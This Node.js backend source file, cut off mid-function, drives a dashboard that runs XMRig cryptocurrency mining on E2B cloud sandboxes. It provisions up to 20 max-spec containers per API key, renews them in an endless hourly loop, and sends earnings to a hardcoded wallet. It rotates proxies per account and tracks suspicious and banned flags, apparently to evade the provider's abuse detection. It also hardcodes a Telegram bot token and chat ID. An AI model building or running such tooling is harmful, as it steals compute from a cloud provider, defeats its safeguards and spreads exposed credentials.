/**
 * Sandbox Mining Dashboard — Backend API (Node.js) — E2B Edition
 * Fully Automated E2B Sandboxes Manager (20 Containers Max)
 *
 * Config:
 *   Platform : 8 vCPU / 8 GiB RAM per container (E2B Custom Template)
 *   Provider : E2B (e2b.dev) — API Key Authentication
 *   Build    : Auto-builds custom template with 8 CPU & 8192 MB RAM with xmrig pre-baked
 *   Clean    : Sinkronisasi 100% container aktif di E2B Cloud on start & loop
 *   Terminal : Displays live miner banner and streaming log
 *   Lifetime : 1 hour per session (auto-renew infinite loop with same template)
 *   Worker   : DASH:XcufdyxZtL4JUjALZfTq6pCrxyTt2Hy2Zu.sal909 (100% CPU / 8 threads)
 *   Proxy    : Dukungan proxy global via global-agent (HTTPS_PROXY env atau PROXY_URL)
 */

'use strict';

const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { URL } = require('url');
const { WebSocketServer } = require('ws');

// ============================================================
// CONFIG & PATHS
// ============================================================

const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 8000;
const DATA_FILE = process.env.DATA_FILE || path.join(__dirname, 'tokens.json');
const SETTINGS_FILE = process.env.SETTINGS_FILE || path.join(__dirname, 'settings.json');
const CONFIG_FILE = process.env.CONFIG_FILE || path.join(__dirname, 'config.json');

// Wallet & Miner fallback jika file config.json kosong atau belum ada
const FALLBACK_WALLET = 'DASH:XcufdyxZtL4JUjALZfTq6pCrxyTt2Hy2Zu.sal909';
const FALLBACK_MINER = 'xmrig';

// ============================================================
// CONFIG.JSON WALLET, MINER & PROXY TOGGLE MANAGER
// ============================================================

function loadConfigFile() {
  try {
    if (fs.existsSync(CONFIG_FILE)) {
      const raw = fs.readFileSync(CONFIG_FILE, 'utf-8');
      const data = JSON.parse(raw);
      const wallet = (data && typeof data.wallet === 'string' && data.wallet.trim()) ? data.wallet.trim() : FALLBACK_WALLET;
      const miner = (data && typeof data.miner === 'string' && data.miner.trim()) ? data.miner.trim().toLowerCase() : FALLBACK_MINER;
      // Dukung: use_proxy, proxy, atau proxy_enabled (default: false / direct connection)
      const use_proxy = data && (data.use_proxy === true || data.proxy === true || data.proxy_enabled === true);
      return { wallet, miner: 'xmrig', use_proxy: !!use_proxy };
    }
  } catch (e) {
    console.error('[CONFIG READ ERROR]', e.message);
  }
  return { wallet: FALLBACK_WALLET, miner: 'xmrig', use_proxy: false };
}

function isProxyEnabled() {
  return loadConfigFile().use_proxy === true;
}

function getActiveWallet() {
  return loadConfigFile().wallet;
}

function getActiveMiner() {
  return 'xmrig';
}

function normalizeMinerType(type) {
  return 'xmrig';
}

function saveConfigFile(wallet, miner, use_proxy) {
  try {
    let current = {};
    if (fs.existsSync(CONFIG_FILE)) {
      try { current = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8')); } catch { }
    }
    if (wallet !== undefined && wallet !== null) {
      current.wallet = String(wallet || '').trim();
    }
    current.miner = 'xmrig';
    if (use_proxy !== undefined && use_proxy !== null) {
      current.use_proxy = !!use_proxy;
    }
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(current, null, 2), 'utf-8');
    return true;
  } catch (e) {
    console.error('[CONFIG WRITE ERROR]', e.message);
    return false;
  }
}

function ensureConfigFile() {
  try {
    if (!fs.existsSync(CONFIG_FILE)) {
      fs.writeFileSync(CONFIG_FILE, JSON.stringify({ wallet: FALLBACK_WALLET, miner: FALLBACK_MINER, use_proxy: false }, null, 2), 'utf-8');
    }
  } catch (e) {
    console.error('[CONFIG INIT ERROR]', e.message);
  }
}
ensureConfigFile();

// ============================================================
// PROXY POOL & PROXY AGENT (DENGAN TOGGLE USE_PROXY)
// ============================================================

function normalizeProxyUrl(raw) {
  if (!raw) return '';
  let url = String(raw).trim();
  if (!url) return '';
  if (!url.startsWith('socks') && !url.startsWith('http')) {
    url = 'socks5://' + url;
  }
  // Auto-correct common port typo jika ada (:1000 -> :10000)
  if (url.includes('gw.dataimpulse.com:1000') && !url.includes('gw.dataimpulse.com:10000') && !url.match(/gw\.dataimpulse\.com:1000\d/)) {
    url = url.replace('gw.dataimpulse.com:1000', 'gw.dataimpulse.com:10000');
  }
  return url;
}

function maskProxy(url) {
  if (!url) return 'NONE';
  return String(url).replace(/(:\/\/[^:]+:)[^@]+(@)/, '$1****$2');
}

function getProxyPool() {
  if (!isProxyEnabled()) {
    return [];
  }
  const pool = [];
  try {
    const proxyFile = path.join(__dirname, 'proxies.txt');
    if (fs.existsSync(proxyFile)) {
      const lines = fs.readFileSync(proxyFile, 'utf-8')
        .split(/\r?\n/)
        .map(l => l.trim())
        .filter(l => l && !l.startsWith('#'));
      for (const line of lines) {
        const url = normalizeProxyUrl(line);
        if (url && !pool.includes(url)) {
          pool.push(url);
        }
      }
    }
  } catch (e) {
    console.warn('[PROXY POOL] Gagal baca proxies.txt:', e.message);
  }
  return pool;
}

const PROXY_POOL = getProxyPool();
if (isProxyEnabled()) {
  console.log(`[PROXY POOL] Proxy AKTIF (use_proxy: true) — Loaded ${PROXY_POOL.length} proxy dari proxies.txt`);
  if (PROXY_POOL.length) {
    PROXY_POOL.forEach((p, i) => {
      console.log(`  [${i}] ${maskProxy(p)}`);
    });
  }
} else {
  console.log(`[PROXY POOL] Proxy NONAKTIF (use_proxy: false di config.json) — Berjalan direct tanpa proxy.`);
}

let _proxyPoolIdx = 0;

function getNextPoolProxy() {
  if (!isProxyEnabled()) return '';
  const pool = getProxyPool();
  if (!pool.length) return '';
  const url = pool[_proxyPoolIdx % pool.length];
  _proxyPoolIdx++;
  return url;
}

function rotateTokenProxy(tokenId, reason = '') {
  if (!isProxyEnabled()) return '';
  const pool = getProxyPool();
  if (!pool.length) return '';
  const t = tokens[tokenId];
  if (!t) return '';
  const curProxy = t.proxy_url || '';
  const curIdx = pool.indexOf(curProxy);
  const nextIdx = (curIdx + 1) % pool.length;
  const newProxy = pool[nextIdx];
  if (newProxy && newProxy !== curProxy) {
    t.proxy_url = newProxy;
    saveTokens();
    for (const sb of Object.values(t.sandboxes || {})) {
      if (sb && sb.id) sandboxCache.delete(sb.id);
    }
    const reasonMsg = reason ? ` (${reason})` : '';
    addLog(tokenId, `🔄 [PROXY ROTATE] Beralih ke proxy baru: ${maskProxy(newProxy)}${reasonMsg}`);
    broadcastState().catch(() => { });
  }
  return newProxy;
}

function getTokenProxy(token) {
  if (!isProxyEnabled()) return '';
  return (token && token.proxy_url) ? normalizeProxyUrl(token.proxy_url) : '';
}

const PROXY_URL = normalizeProxyUrl(process.env.PROXY_URL || process.env.HTTPS_PROXY || process.env.HTTP_PROXY || '');
let _proxyAgent = null;

function getProxyAgent() {
  if (!isProxyEnabled()) return null;
  return _proxyAgent;
}

function getProxyOption(proxyInput) {
  if (!isProxyEnabled()) return {};
  let target = '';
  if (typeof proxyInput === 'string' && proxyInput.trim()) {
    target = normalizeProxyUrl(proxyInput);
  } else if (PROXY_URL) {
    target = PROXY_URL;
  }
  return target ? { proxy: target } : {};
}

if (isProxyEnabled() && PROXY_URL) {
  try {
    const masked = maskProxy(PROXY_URL);
    const { SocksProxyAgent } = require('socks-proxy-agent');
    _proxyAgent = new SocksProxyAgent(PROXY_URL);
    console.log(`[PROXY GLOBAL] Proxy global aktif: ${masked}`);
  } catch (e) {
    console.warn('[PROXY GLOBAL] Gagal init:', e.message);
  }
}

// ============================================================
// CONFIG AUTO-WATCHER
// ============================================================

let lastWatchedWallet = getActiveWallet();
let lastWatchedMiner = getActiveMiner();
let lastWatchedUseProxy = isProxyEnabled();

function watchConfigFile() {
  try {
    fs.watchFile(CONFIG_FILE, { interval: 1000 }, () => {
      const cfg = loadConfigFile();
      const current = cfg.wallet;
      const currentMiner = cfg.miner;
      const currentUseProxy = cfg.use_proxy;
      let changed = false;

      if (current && current !== lastWatchedWallet) {
        lastWatchedWallet = current;
        console.log(`\n===============================================================`);
        console.log(`💰 [CONFIG] Wallet di config.json diperbarui: '${current}'`);
        console.log(`===============================================================\n`);
        for (const tid of Object.keys(tokens)) {
          if (tokens[tid] && tokens[tid].config) {
            tokens[tid].config.wallet = current;
          }
        }
        changed = true;
      }

      if (currentMiner && currentMiner !== lastWatchedMiner) {
        lastWatchedMiner = currentMiner;
        console.log(`\n===============================================================`);
        console.log(`⛏️ [CONFIG] Miner default di config.json diperbarui: '${currentMiner}'`);
        console.log(`===============================================================\n`);
        changed = true;
      }

      if (typeof currentUseProxy === 'boolean' && currentUseProxy !== lastWatchedUseProxy) {
        lastWatchedUseProxy = currentUseProxy;
        console.log(`\n===============================================================`);
        console.log(`🌐 [CONFIG] Proxy di config.json diubah: ${currentUseProxy ? 'AKTIF / TRUE (Menggunakan proxies.txt)' : 'NONAKTIF / FALSE (Direct Connection Tanpa Proxy)'}`);
        console.log(`===============================================================\n`);
        _proxyAgentCache.clear();
        changed = true;
      }

      if (changed) {
        saveTokens();
        broadcastState();
      }
    });
  } catch (e) {
    console.error('[CONFIG WATCH ERROR]', e.message);
  }
}
watchConfigFile();

// Nama / ID RDP (Dapat diubah lewat UI atau env, otomatis nama Komputer/Hostname)
function loadRdpName() {
  try {
    if (fs.existsSync(SETTINGS_FILE)) {
      const data = JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf-8'));
      if (data && data.rdp_name && String(data.rdp_name).trim()) {
        return String(data.rdp_name).trim();
      }
    }
  } catch (e) { }
  return process.env.RDP_NAME || process.env.RDP_ID || os.hostname() || 'RDP-1';
}

function saveRdpName(name) {
  try {
    let data = {};
    if (fs.existsSync(SETTINGS_FILE)) {
      try { data = JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf-8')); } catch { }
    }
    data.rdp_name = name;
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(data, null, 2), 'utf-8');
  } catch (e) {
    console.error('[SETTINGS SAVE ERROR]', e.message);
  }
}

let RDP_NAME = loadRdpName();

// ============================================================
// TELEGRAM BOT CONFIGURATION (DAPAT DIPAKAI BERSAMA BANYAK RDP)
// ============================================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8962233362:AAG3jtCwQ3On5vDx8vjDRH4ihigWoqIUtLE';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8949644128';

// Spesifikasi container E2B: 8 Core & 8 GB RAM (8192 MB) — Batas Maksimal Akun E2B Hobby Plan
const REQUIRED_CPUS = 8;
const REQUIRED_MEM_MB = 8192; // 8 GB (8192 MiB batas maksimum akun E2B)
const DEFAULT_TOTAL = 20;
const MAX_TOTAL = 20;    // Batas container per akun E2B
const DEFAULT_CPU_PERCENT = 100; // Default 100% CPU
const DEFAULT_THREADS = 8;       // Dihitung dari cpu_percent * 8 / 100
const DEFAULT_WALLET = getActiveWallet();

// Hitung jumlah thread dari persentase CPU (1-100% dari 8 core)
function cpuPercentToThreads(cpuPct) {
  const pct = Math.min(100, Math.max(1, parseInt(cpuPct, 10) || DEFAULT_CPU_PERCENT));
  return Math.max(1, Math.round(pct * REQUIRED_CPUS / 100));
}

// Hitung Docker --cpus flag dari persentase CPU
function cpuPercentToDockerCpus(cpuPct) {
  const pct = Math.min(100, Math.max(1, parseInt(cpuPct, 10) || DEFAULT_CPU_PERCENT));
  return (pct * REQUIRED_CPUS / 100).toFixed(2);
}

// Batas Mutlak Platform E2B Cloud: Maksimal 1 Jam (3600 detik = 3.600.000 ms) per Sandbox
// Percobaan membuat sandbox > 1 jam akan ditolak E2B dengan error: "400: Timeout cannot be greater than 1 hours"
const MAX_E2B_SANDBOX_TIMEOUT_MS = 60 * 60 * 1000; // 1 Jam limit mutlak E2B
const DEFAULT_HOURS = 1;              // Default 1 jam sesuai batas E2B Sandbox
const MAX_HOURS = 24;
const MIN_HOURS = 1;
const DEFAULT_EXEC_MODE = 'watchdog';
const DEFAULT_MINER_TYPE = 'xmrig';

// Software Miner: XMRig (Algoritma RandomX / rx.unmineable.com:443)
const MINER_TYPES = {
  xmrig: {
    id: 'xmrig',
    name: 'XMRig (RandomX)',
    short: 'XMRig',
    icon: '⚡',
    optionNum: 1,
    algo: 'rx/0',
    pool: 'rx.unmineable.com:443',
    protocol: 'stratum+ssl',
    binary: 'xmrig',
    apiPort: 8080,
    desc: 'XMRig CPU Miner (Algoritma RandomX rx/0 - rx.unmineable.com:443 TLS)'
  }
};

// Opsi Eksekusi: Native Watchdog Supervisor (Tanpa Docker, Auto-Restart & Telemetry)
const EXEC_MODES = {
  watchdog: {
    id: 'watchdog',
    name: 'Native Watchdog Supervisor',
    short: 'Watchdog',
    icon: '🛡️',
    desc: 'Miner berjalan native di host sandbox dengan Watchdog Supervisor otomatis (Auto-Restart, Auto-Heal, Telemetry API). Cepat, hemat resource, tanpa Docker!'
  },
  docker: {
    id: 'docker',
    name: 'Docker Background (Fallback)',
    short: 'Docker Bg',
    icon: '🐳',
    desc: 'Miner berjalan di dalam Docker container (detached mode).'
  },
};

function getDurationMs(hours = DEFAULT_HOURS) {
  const h = Math.min(Math.max(parseInt(hours, 10) || DEFAULT_HOURS, MIN_HOURS), MAX_HOURS);
  return h * 60 * 60 * 1000;
}

// Interval checks: 8 detik agar tampilan dashboard live & responsif
const CHECK_INTERVAL = 8 * 1000;

// ============================================================
// LAZY LOAD E2B SDK & INSTANCE CACHE
// ============================================================

let _e2b = null;
const sandboxCache = new Map();

async function getE2B() {
  if (_e2b) return _e2b;
  try {
    // Gunakan dist/index.mjs terlebih dahulu untuk menghindari konflik ESM require(chalk) di Node < 22
    let mod;
    try {
      mod = await import('e2b/dist/index.mjs');
    } catch {
      mod = await import('e2b');
    }
    _e2b = mod;
    return _e2b;
  } catch (e) {
    throw new Error(`E2B SDK tidak terinstall / gagal dimuat. Jalankan: npm install e2b\nDetail: ${e.message}`);
  }
}

// ============================================================
// IN-MEMORY STATE
// ============================================================

const tokens = {};
const logs = {};
const tasks = {};
const wsClients = new Set();
const sequenceQueue = [];
const activeProvisioningTokenIds = new Set();
let isQueueWorkerRunning = false;

// ============================================================
// PERSISTENCE
// ============================================================

function saveTokens() {
  const data = {};
  for (const [tid, t] of Object.entries(tokens)) {
    data[tid] = {
      name: t.name,
      api_key: t.api_key || '',
      proxy_url: t.proxy_url || '',
      template_id: t.template_id || '',
      template_status: t.template_status || 'none',
      run_started_at: t.run_started_at || null,
      cycle_started_at: t.cycle_started_at || null,
      rerun_count: typeof t.rerun_count === 'number' ? t.rerun_count : 0,
      is_sus: !!t.is_sus,
      sus_count: t.sus_count || 0,
      last_sus_at: t.last_sus_at || null,
      last_sus_reason: t.last_sus_reason || '',
      config: {
        ...(t.config || {}),
        hours: Math.min(Math.max(parseInt(t.config?.hours, 10) || DEFAULT_HOURS, MIN_HOURS), MAX_HOURS),
        exec_mode: t.config?.exec_mode || DEFAULT_EXEC_MODE,
        miner_type: t.config?.miner_type || DEFAULT_MINER_TYPE,
        cpu_percent: Math.min(100, Math.max(1, parseInt(t.config?.cpu_percent, 10) || DEFAULT_CPU_PERCENT)),
        threads: t.config?.threads || cpuPercentToThreads(t.config?.cpu_percent || DEFAULT_CPU_PERCENT),
      },
      sandboxes: Object.fromEntries(
        Object.entries(t.sandboxes || {}).map(([slot, sb]) => [slot, {
          id: sb.id || '',
          name: sb.name || '',
          status: sb.status || 'unknown',
          hashrate_10s: sb.hashrate_10s || 0,
          hashrate_60s: sb.hashrate_60s || 0,
          hashrate_15m: sb.hashrate_15m || 0,
          last_check: sb.last_check || '',
          started_at: sb.started_at || '',
          end_at: sb.end_at || '',
          watchdog: sb.watchdog || 'active',
          restarts: sb.restarts || 0,
          watchdog_mode: sb.watchdog_mode || 'supervisor',
          exec_mode: sb.exec_mode || t.config?.exec_mode || DEFAULT_EXEC_MODE,
          miner_type: sb.miner_type || t.config?.miner_type || DEFAULT_MINER_TYPE,
          hours: sb.hours || t.config?.hours || DEFAULT_HOURS,
          cpu_percent: Math.min(100, Math.max(1, parseInt(sb.cpu_percent || t.config?.cpu_percent, 10) || DEFAULT_CPU_PERCENT)),
          threads: sb.threads || cpuPercentToThreads(sb.cpu_percent || t.config?.cpu_percent || DEFAULT_CPU_PERCENT),
        }])
      ),
    };
  }
  try {
    const dir = path.dirname(DATA_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf-8');
  } catch (e) {
    console.error('[SAVE ERROR]', e.message);
  }
}

function loadTokens() {
  if (!fs.existsSync(DATA_FILE)) return {};
  try {
    const raw = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
    const result = {};
    for (const [tid, t] of Object.entries(raw)) {
      const tokenCpuPct = Math.min(100, Math.max(1, parseInt(t.config?.cpu_percent, 10) || DEFAULT_CPU_PERCENT));
      const tokenThreads = t.config?.threads || cpuPercentToThreads(tokenCpuPct);
      const tokenMinerType = t.config?.miner_type && MINER_TYPES[t.config.miner_type] ? t.config.miner_type : DEFAULT_MINER_TYPE;
      const sandboxes = {};
      for (const [slot, sb] of Object.entries(t.sandboxes || {})) {
        const sbCpu = Math.min(100, Math.max(1, parseInt(sb.cpu_percent || tokenCpuPct, 10) || DEFAULT_CPU_PERCENT));
        sandboxes[parseInt(slot, 10)] = {
          ...sb,
          started_at: sb.started_at || '',
          end_at: sb.end_at || '',
          watchdog: sb.watchdog || 'active',
          restarts: sb.restarts || 0,
          watchdog_mode: sb.watchdog_mode || 'supervisor',
          exec_mode: sb.exec_mode || t.config?.exec_mode || DEFAULT_EXEC_MODE,
          miner_type: sb.miner_type || tokenMinerType,
          hours: sb.hours || t.config?.hours || DEFAULT_HOURS,
          cpu_percent: sbCpu,
          threads: sb.threads || cpuPercentToThreads(sbCpu),
        };
      }
      let tokenProxy = normalizeProxyUrl(t.proxy_url || '');
      if (!tokenProxy && PROXY_POOL.length) {
        tokenProxy = getNextPoolProxy();
      }
      result[tid] = {
        name: t.name || tid,
        api_key: t.api_key || '',
        proxy_url: tokenProxy,
        template_id: t.template_id || '',
        template_status: t.template_status || (t.template_id ? 'ready' : 'none'),
        run_started_at: t.run_started_at || null,
        cycle_started_at: t.cycle_started_at || null,
        rerun_count: typeof t.rerun_count === 'number' ? t.rerun_count : 0,
        is_sus: !!t.is_sus,
        sus_count: typeof t.sus_count === 'number' ? t.sus_count : 0,
        last_sus_at: t.last_sus_at || null,
        last_sus_reason: t.last_sus_reason || '',
        config: {
          total: Math.min(t.config?.total || DEFAULT_TOTAL, MAX_TOTAL),
          wallet: t.config?.wallet || getActiveWallet(),
          cpu_percent: tokenCpuPct,
          threads: tokenThreads,
          hours: Math.min(Math.max(parseInt(t.config?.hours, 10) || DEFAULT_HOURS, MIN_HOURS), MAX_HOURS),
          exec_mode: t.config?.exec_mode || DEFAULT_EXEC_MODE,
          miner_type: tokenMinerType,
          template_id: t.config?.template_id || t.template_id || '',
          cpus: REQUIRED_CPUS,
          memMb: REQUIRED_MEM_MB,
        },
        sandboxes,
      };
    }
    return result;
  } catch (e) {
    console.error('[LOAD ERROR]', e.message);
    return {};
  }
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

// ============================================================
// TEMPLATE BUILDER (8 vCPU / 8 GB RAM)
// ============================================================

/**
 * Membangun template E2B custom baru dengan spek 8 Core & 8 GB RAM.
 * XMRig langsung di-bake ke dalam image (/usr/local/bin/xmrig) dengan user 'root'.
 */
async function buildMinerTemplate(apiKey, tokenId, options = {}) {
  const { Template } = await getE2B();
  const t = tokens[tokenId];
  const templateName = 'miner-8c-8gb';
  const proxyOpt = getProxyOption(t?.proxy_url);

  console.log(`🔨 [BUILD] Memulai pembuatan template E2B baru ('${templateName}')...`);
  if (t?.proxy_url) {
    console.log(`🌐 [BUILD] Menggunakan proxy token: ${maskProxy(t.proxy_url)}`);
  }
  console.log(`⚙️ [BUILD] Spesifikasi: 8 vCPU | 8192 MB RAM (Pre-Baked: XMRig RandomX)`);
  if (t) {
    t.template_status = 'building';
    saveTokens();
    await broadcastState();
  }

  try {
    const template = Template()
      .fromBaseImage()
      .setUser('root')
      .runCmd('apt-get update && apt-get install -y util-linux procps curl ca-certificates tar xz-utils python3 && ' +
        'curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -o /tmp/xmrig.tar.gz && ' +
        'tar -xf /tmp/xmrig.tar.gz -C /usr/local/bin --strip-components=1 && ' +
        'rm -f /tmp/xmrig.tar.gz /usr/local/bin/config.json && ' +
        'chmod +x /usr/local/bin/xmrig');

    console.log(`📦 [BUILD] Mengirim instruksi build ke E2B Cloud Compiler...`);

    const buildInfo = await Template.build(template, templateName, {
      cpuCount: REQUIRED_CPUS,
      memoryMB: REQUIRED_MEM_MB,
      apiKey: apiKey,
      skipCache: options.skipCache !== undefined ? !!options.skipCache : false,
      ...proxyOpt,
      onBuildLogs: (log) => {
        const text = typeof log === 'string' ? log : (log.line || log.message || '');
        if (text && text.trim()) {
          console.log(`[BUILD] ${text.trim()}`);
        }
      }
    });

    const finalTemplateId = buildInfo.templateId || templateName;
    addLog(tokenId, `🎉 [BUILD SELESAI] Template '${templateName}' siap! Template ID: ${finalTemplateId}`);

    if (t) {
      t.template_id = finalTemplateId;
      t.template_status = 'ready';
      (t.config = t.config || {}).template_id = finalTemplateId;
      saveTokens();
      await broadcastState();
    }

    return [finalTemplateId, null];
  } catch (e) {
    let msg = e?.message || String(e);
    if (e?.response?.data?.message) {
      msg = `${msg}: ${e.response.data.message}`;
    }
    addLog(tokenId, `⚠️ [BUILD INFO] Custom template build notice (${msg}). Akan fallback ke template base.`);
    if (t) {
      t.template_status = 'fallback_base';
      saveTokens();
      await broadcastState();
    }
    return [null, msg];
  }
}

// ============================================================
// E2B CLIENT OPERATIONS (DENGAN PAGINASI LENGKAP & CACHING)

// ============================================================
// PER-TOKEN PROXY AGENT FACTORY
// Mendukung: socks5://, socks4://, http://, https://
// ============================================================

// Cache proxy agents per URL agar tidak buat ulang tiap call
const _proxyAgentCache = new Map();

/**
 * Buat proxy agent dari URL proxy.
 * Mengembalikan agent yang bisa diteruskan ke E2B SDK atau fetch().
 * @param {string} proxyUrl - URL proxy, mis. socks5://user:pass@host:port
 * @returns {object|null} proxy agent instance atau null jika tidak ada proxy
 */
function makeProxyAgent(proxyUrl) {
  if (!proxyUrl) return getProxyAgent();
  let url = proxyUrl.trim();
  if (!url) return getProxyAgent();
  // Auto-prefix socks5:// jika format raw DataImpulse: user:pass@host:port
  if (!url.startsWith('socks') && !url.startsWith('http')) {
    url = 'socks5://' + url;
  }
  if (_proxyAgentCache.has(url)) return _proxyAgentCache.get(url);
  try {
    const isSocks = url.startsWith('socks');
    let agent;
    if (isSocks) {
      const { SocksProxyAgent } = require('socks-proxy-agent');
      agent = new SocksProxyAgent(url);
    } else {
      const { HttpsProxyAgent } = require('https-proxy-agent');
      agent = new HttpsProxyAgent(url);
    }
    _proxyAgentCache.set(url, agent);
    const masked = url.replace(/(socks5?|https?):\/\/([^:]+):([^@]+)@/, '$1://$2:****@');
    console.log(`[PROXY] Agent dibuat: ${masked}`);
    return agent;
  } catch (e) {
    console.warn('[PROXY AGENT] Gagal buat agent:', url, e.message);
    return getProxyAgent();
  }
}
// ============================================================

/**
 * Membuat sandbox baru menggunakan E2B SDK
 */
async function createE2BSandbox(apiKey, templateId, displayName, durationHours = DEFAULT_HOURS, proxyUrl = '') {
  const { Sandbox } = await getE2B();
  // E2B API membatasi timeout per sandbox maksimal 1 jam (3.600.000 ms).
  // Nilai lebih dari 1 jam akan ditolak E2B dengan error "400: Timeout cannot be greater than 1 hours".
  const requestedMs = getDurationMs(durationHours);
  const timeoutMs = Math.min(requestedMs, MAX_E2B_SANDBOX_TIMEOUT_MS);
  const proxyOpt = getProxyOption(proxyUrl);
  const createOpts = {
    apiKey,
    timeoutMs,
    metadata: { name: displayName || 'miner', source: 'mining-dashboard' },
    ...proxyOpt,
  };

  try {
    let sb;
    if (templateId) {
      try {
        sb = await Sandbox.create(templateId, createOpts);
      } catch (tmplErr) {
        const errStr = (tmplErr.message || String(tmplErr)).toLowerCase();
        if (errStr.includes('not found') || errStr.includes('404')) {
          console.warn(`[CREATE] Template '${templateId}' tidak ditemukan, fallback ke base template...`);
          sb = await Sandbox.create(createOpts);
        } else {
          throw tmplErr;
        }
      }
    } else {
      sb = await Sandbox.create(createOpts);
    }
    const sid = sb.sandboxId || sb.id;
    if (sid) sandboxCache.set(sid, sb);
    return [sb, null];
  } catch (e) {
    let msg = e?.message || String(e);
    if (e?.response?.data?.message) {
      msg = `${msg}: ${e.response.data.message}`;
    } else if (e?.response?.data?.error) {
      msg = `${msg}: ${e.response.data.error}`;
    } else if (e?.cause?.message) {
      msg = `${msg}: ${e.cause.message}`;
    }
    return [null, msg];
  }
}

/**
 * List SEMUA running sandboxes dari akun E2B secara menyeluruh (PAGINATED)
 */
async function listE2BSandboxes(apiKey, proxyUrl = '') {
  const { Sandbox } = await getE2B();
  const proxyOpt = getProxyOption(proxyUrl);
  try {
    const paginator = Sandbox.list({ apiKey, ...proxyOpt });
    const all = [];
    while (paginator.hasNext) {
      const items = await paginator.nextItems();
      if (!items || !items.length) break;
      all.push(...items);
    }
    return [all, null];
  } catch (e) {
    let msg = e?.message || String(e);
    if (e?.response?.data?.message) {
      msg = `${msg}: ${e.response.data.message}`;
    }
    console.error('[E2B LIST ERROR]', msg);
    return [[], msg];
  }
}

/**
 * Terminate sandbox di E2B
 */
async function killE2BSandbox(apiKey, sandboxId, proxyUrl = '') {
  sandboxCache.delete(sandboxId);
  const { Sandbox } = await getE2B();
  const proxyOpt = getProxyOption(proxyUrl);
  try {
    await Sandbox.kill(sandboxId, { apiKey, ...proxyOpt });
    return true;
  } catch (e) {
    console.error('[E2B KILL ERROR]', sandboxId, e.message);
    return false;
  }
}

/**
 * Connect ke existing sandbox dengan caching instance
 */
async function connectE2BSandbox(apiKey, sandboxId, proxyUrl = '') {
  const normProxy = isProxyEnabled() ? normalizeProxyUrl(proxyUrl) : '';
  const cached = sandboxCache.get(sandboxId);
  if (cached && cached.proxyUrl === normProxy) {
    return [cached.sb, null];
  }
  sandboxCache.delete(sandboxId);

  const { Sandbox } = await getE2B();
  const proxyOpt = getProxyOption(normProxy);
  try {
    const sb = await Sandbox.connect(sandboxId, { apiKey, ...proxyOpt, requestTimeoutMs: 35000 });
    sandboxCache.set(sandboxId, { sb, proxyUrl: normProxy });
    return [sb, null];
  } catch (e) {
    sandboxCache.delete(sandboxId);
    let msg = e?.message || String(e);
    if (e?.response?.data?.message) msg = `${msg}: ${e.response.data.message}`;
    return [null, msg];
  }
}

/**
 * Execute command di sandbox via E2B SDK
 */
async function execInE2BSandbox(apiKey, sandboxId, shellCmd, timeoutMs = 25000, proxyUrl = '') {
  const sanitizedCmd = (shellCmd || '').replace(/\r\n/g, '\n').replace(/\r/g, '\n');
  for (let attempt = 1; attempt <= 2; attempt++) {
    try {
      const [sb, err] = await connectE2BSandbox(apiKey, sandboxId, proxyUrl);
      if (!sb) {
        if (err && (err.includes('not found') || err.includes('404') || err.includes('NotFound'))) {
          sandboxCache.delete(sandboxId);
          return { stdout: '', stderr: 'notFound', exitCode: 1, ok: false, notFound: true };
        }
        throw new Error(err || 'Cannot connect to sandbox');
      }

      const result = await sb.commands.run(sanitizedCmd, { timeoutMs });
      return {
        stdout: result.stdout || '',
        stderr: result.stderr || '',
        exitCode: result.exitCode ?? 0,
        ok: (result.exitCode ?? 0) === 0,
      };
    } catch (e) {
      const msg = e.message || '';
      sandboxCache.delete(sandboxId);
      if (msg.includes('not found') || msg.includes('404') || msg.includes('NotFound') || msg.includes('sandboxID')) {
        return { stdout: '', stderr: 'notFound', exitCode: 1, ok: false, notFound: true };
      }
      if (attempt < 2) {
        await sleep(1000);
        continue;
      }
      return { stdout: '', stderr: msg, exitCode: 1, ok: false };
    }
  }
}

// ============================================================
// HELPERS / LOGGING / BROADCAST
// ============================================================

function addLog(tokenId, msg) {
  const time = new Date().toISOString();
  const entry = { time, msg };
  if (!logs[tokenId]) logs[tokenId] = [];
  logs[tokenId].push(entry);
  if (logs[tokenId].length > 500) logs[tokenId] = logs[tokenId].slice(-500);

  const timeStr = new Date().toLocaleTimeString('id-ID');
  console.log(`[${timeStr}] [E2B] [${tokens[tokenId]?.name || tokenId}] ${msg}`);

  broadcast({ type: 'log', token_id: tokenId, entry }).catch(() => { });
}

async function broadcast(data) {
  const msg = JSON.stringify(data);
  const dead = [];
  for (const ws of wsClients) {
    try {
      if (ws.readyState === 1) ws.send(msg);
      else dead.push(ws);
    } catch {
      dead.push(ws);
    }
  }
  dead.forEach(ws => wsClients.delete(ws));
}

function toIsoDate(val) {
  if (!val) return '';
  if (val instanceof Date) return val.toISOString();
  if (typeof val === 'number') return new Date(val).toISOString();
  if (typeof val === 'string') {
    const d = new Date(val);
    return isNaN(d.getTime()) ? val : d.toISOString();
  }
  return '';
}

async function broadcastState() {
  await broadcast({
    type: 'state',
    rdp_name: RDP_NAME,
    wallet: getActiveWallet(),
    miner: getActiveMiner(),
    use_proxy: isProxyEnabled(),
    tokens: getAllTokensSummary()
  });
}

// ============================================================
// TELEGRAM BOT LOGGING (RERUN, SUS, BANNED NOTIFICATIONS)
// ============================================================

function formatWIB(date = new Date()) {
  try {
    return date.toLocaleString('id-ID', {
      timeZone: 'Asia/Jakarta',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false,
    }) + ' WIB';
  } catch {
    return date.toISOString();
  }
}

function escapeHtml(str) {
  return String(str || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

async function sendTelegramMessage(htmlText, retryCount = 0) {
